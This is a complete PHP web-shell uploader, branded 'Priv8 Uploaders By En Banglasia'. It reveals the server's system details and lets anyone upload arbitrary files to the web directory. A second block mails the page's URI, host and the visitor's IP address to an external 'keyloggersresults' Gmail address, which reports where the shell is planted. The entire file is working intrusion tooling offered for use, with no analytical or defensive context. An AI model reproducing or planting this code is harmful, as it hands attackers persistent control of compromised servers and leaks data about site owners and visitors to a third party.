En Banglasia
<?php
echo '<b>Priv8 Uploaders By En Banglasia<br><br>' . php_uname() . '<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if ($_POST['_upl'] == "Upload") {
 if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
  echo '<b>Hey Idiots? Successfully!</b><br><br>';
 } else {
  echo '<b>Hey Idiots? Failed!</b><br><br>';
 }
}
?>
<?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " ap1d.my |$ip";
$email = "keyloggersresults@gmail.com";
$from = "From: Keyloggers<ap1d@ap1d.my";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>
